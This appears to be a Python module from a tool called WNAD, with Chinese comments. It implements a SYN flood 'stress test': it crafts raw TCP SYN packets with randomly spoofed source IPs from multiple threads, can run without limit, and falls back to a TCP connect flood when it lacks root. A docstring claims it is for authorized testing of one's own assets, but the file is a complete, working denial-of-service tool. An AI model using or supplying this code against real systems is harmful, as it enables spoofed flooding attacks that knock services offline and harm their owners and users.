"""
WNAD - SYN Flood 压力测试模块 [需要 ROOT 权限]
基于 RAW Socket 发送大量伪造 SYN 包
仅用于合法授权的自有资产测试
"""

import socket
import struct
import time
import random
import threading
from core.utils import C, CHECK, CROSS, INFO, ROOT, WARN, progress_bar
from core.root_check import require_root_graceful


def _checksum(data: bytes) -> int:
    """计算 IP/TCP 校验和"""
    if len(data) % 2 != 0:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def _create_syn_packet(src_ip: str, src_port: int, dst_ip: str, dst_port: int,
                       seq_num: int) -> bytes:
    """
    创建 TCP SYN 包
    包含 IP 头 + TCP 头
    """
    # IP 头
    ip_ver_ihl = 0x45  # IPv4, 5*4=20字节头部
    ip_tos = 0
    ip_total_len = 40  # 20(IP) + 20(TCP)
    ip_id = random.randint(0, 65535)
    ip_flags_fo = 0x4000  # Don't Fragment
    ip_ttl = 64
    ip_proto = socket.IPPROTO_TCP
    ip_hdr = struct.pack("!BBHHHBBH", ip_ver_ihl, ip_tos, ip_total_len,
                         ip_id, ip_flags_fo, ip_ttl, ip_proto, 0)
    ip_src = socket.inet_aton(src_ip)
    ip_dst = socket.inet_aton(dst_ip)

    # IP 校验和（先设为0）
    ip_checksum = _checksum(ip_hdr + ip_src + ip_dst)
    ip_hdr = struct.pack("!BBHHHBBH", ip_ver_ihl, ip_tos, ip_total_len,
                         ip_id, ip_flags_fo, ip_ttl, ip_proto, ip_checksum)

    # TCP 头
    tcp_src = src_port
    tcp_dst = dst_port
    tcp_seq = seq_num
    tcp_ack = 0
    tcp_offset = 0x50  # 数据偏移 5 (20字节)
    tcp_flags = 0x02   # SYN
    tcp_window = socket.htons(65535)
    tcp_urg_ptr = 0

    tcp_hdr_no_checksum = struct.pack("!HHLLBBHHH", tcp_src, tcp_dst,
                                       tcp_seq, tcp_ack, tcp_offset, tcp_flags,
                                       tcp_window, 0, tcp_urg_ptr)

    # TCP 伪头校验和
    pseudo_hdr = struct.pack("!4s4sBBH", ip_src, ip_dst, 0, socket.IPPROTO_TCP,
                             len(tcp_hdr_no_checksum))
    tcp_checksum = _checksum(pseudo_hdr + tcp_hdr_no_checksum)

    tcp_hdr = struct.pack("!HHLLBBHHH", tcp_src, tcp_dst,
                          tcp_seq, tcp_ack, tcp_offset, tcp_flags,
                          tcp_window, tcp_checksum, tcp_urg_ptr)

    return ip_hdr + ip_src + ip_dst + tcp_hdr


def syn_flood(target_ip: str, target_port: int, src_ip: str = None,
              threads: int = 4, count: int = 10000):
    """
    SYN Flood 压力测试
    - target_ip: 目标 IP
    - target_port: 目标端口
    - src_ip: 伪造源 IP（默认随机）
    - threads: 并发线程数
    - count: 发送包数（0 = 无限）
    """
    root = require_root_graceful("SYN Flood", "退化为 TCP Connect Flood (无 root 慢速版)")
    if root is True:
        _syn_flood_root(target_ip, target_port, src_ip, threads, count)
    elif root is False:
        tcp_connect_flood(target_ip, target_port, count=count)
    # None = 用户取消，不操作


def _syn_flood_root(target_ip: str, target_port: int, src_ip: str,
                    threads: int, count: int):

    # 伪造源 IP
    if not src_ip:
        src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))

    print(f" {ROOT} {C.RED}SYN Flood 压力测试{C.NC}")
    print(f" {INFO} 目标: {C.CYAN}{target_ip}:{target_port}{C.NC}")
    print(f" {INFO} 源 IP: {C.CYAN}{src_ip} (随机){C.NC}")
    print(f" {INFO} 线程: {threads}, 发包数: {'无限' if count == 0 else count}\n")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(f" {CROSS} 需要 root 权限创建 RAW Socket")
        return
    except Exception as e:
        print(f" {CROSS} 无法创建 socket: {e}")
        return

    sent = 0
    stop_event = threading.Event()

    def sender_thread():
        nonlocal sent
        local_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        local_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        try:
            while not stop_event.is_set():
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 2**31)
                # 随机源 IP（每包更换增加欺骗性）
                fake_src = ".".join(str(random.randint(1, 254)) for _ in range(4))
                packet = _create_syn_packet(fake_src, src_port, target_ip, target_port, seq)
                local_sock.sendto(packet, (target_ip, 0))
                sent += 1
                if count > 0 and sent >= count:
                    break
        except Exception:
            pass
        finally:
            local_sock.close()

    try:
        workers = []
        for _ in range(threads):
            t = threading.Thread(target=sender_thread, daemon=True)
            t.start()
            workers.append(t)

        start_time = time.time()
        last_sent = 0
        while workers:
            elapsed = time.time() - start_time
            if count > 0 and sent >= count:
                break
            if elapsed > 0:
                pps = int(sent / elapsed)
                print(f" {INFO} 已发送: {sent} 包 | 速率: {pps} pkt/s", end="\r")
            time.sleep(1)
            if sent == last_sent and elapsed > 5:
                # 如果5秒内无进展，可能被防火墙阻断
                print(f"\n {WARN} 发送停滞，可能被目标防火墙阻断")
                break
            last_sent = sent

    except KeyboardInterrupt:
        print(f"\n {INFO} 用户中断")

    finally:
        stop_event.set()
        for t in workers:
            t.join(timeout=1)
        sock.close()
        elapsed = time.time() - start_time if 'start_time' in dir() else 0
        pps = int(sent / elapsed) if elapsed > 0 else 0
        print(f"\n {CHECK} SYN Flood 已停止")
        print(f" {INFO} 共发送 {sent} 个 SYN 包, 平均速率 {pps} pkt/s, 耗时 {elapsed:.1f}s")


def tcp_connect_flood(target_ip: str, target_port: int,
                      count: int = 100, delay: float = 0.01):
    """
    TCP Connect Flood（非 root 阉割版）
    用 socket.connect() 建立完整 TCP 连接，替代 RAW Socket SYN Flood
    速度较慢，每秒约 100 连接，但无需 root 权限
    """
    print(f" {INFO} {C.YELLOW}TCP Connect Flood (无 root 慢速版){C.NC}")
    print(f" {INFO} 目标: {C.CYAN}{target_ip}:{target_port}{C.NC}")
    print(f" {INFO} 发包数: {count if count > 0 else '无限'}, 延迟: {delay*1000:.0f}ms\n")

    sent = 0
    errors = 0
    start_time = time.time()

    try:
        for i in range(count) if count > 0 else iter(int, 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target_ip, target_port))
                sock.close()
                sent += 1
            except (ConnectionRefusedError, OSError, socket.timeout):
                errors += 1
            except Exception:
                errors += 1

            if sent % 10 == 0:
                elapsed = time.time() - start_time
                rate = sent / elapsed if elapsed > 0 else 0
                info = f"已连接: {sent} | 失败: {errors} | 速率: {rate:.0f} conn/s"
                print(f" {INFO} {info}", end="\r")

            time.sleep(delay)

    except KeyboardInterrupt:
        print(f"\n {INFO} 用户中断")

    elapsed = time.time() - start_time
    rate = sent / elapsed if elapsed > 0 else 0
    print(f"\n {CHECK} TCP Connect Flood 已停止")
    print(f" {INFO} 成功连接: {sent}, 失败: {errors}, 速率: {rate:.1f} conn/s, 耗时: {elapsed:.1f}s")
